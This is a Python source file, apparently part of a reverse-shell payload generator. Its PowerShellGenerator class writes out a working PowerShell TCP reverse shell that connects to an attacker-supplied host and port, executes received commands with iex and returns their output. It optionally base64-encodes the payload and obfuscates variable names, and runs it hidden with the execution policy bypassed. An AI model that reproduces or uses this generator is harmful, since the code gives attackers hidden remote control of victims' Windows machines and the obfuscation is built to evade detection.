import base64
import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["tcpclient", "tcpclient_b64"]


class PowerShellGenerator(ShellGenerator):
    language = "powershell"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        # x64 arch gets base64-encoded by default; obfuscate=True adds a coin-flip
        use_b64 = arch == "x64" or (names is not None and random.random() > 0.5)
        variant = "tcpclient_b64" if use_b64 else "tcpclient"

        raw = self._tcpclient_raw(lhost, lport, names)

        if use_b64:
            # PowerShell requires UTF-16LE for -EncodedCommand
            encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"
        else:
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass \"{raw}\""

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _tcpclient_raw(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        buf = self._var("buf", names)
        data = self._var("data", names)
        ob = self._var("ob", names)
        ob2 = self._var("ob2", names)
        sb = self._var("sb", names)

        return (
            f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();"
            f"[byte[]]${buf}=0..65535|%{{0}};"
            f"while(($i=$s.Read(${buf},0,${buf}.Length)) -ne 0){{"
            f"${data}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${buf},0,$i);"
            f"${ob}=(iex ${data} 2>&1|Out-String);"
            f"${ob2}=${ob}+'PS '+(pwd).Path+'> ';"
            f"${sb}=[text.encoding]::ASCII.GetBytes(${ob2});"
            f"$s.Write(${sb},0,${sb}.Length);$s.Flush()}};"
            f"$c.Close()"
        )
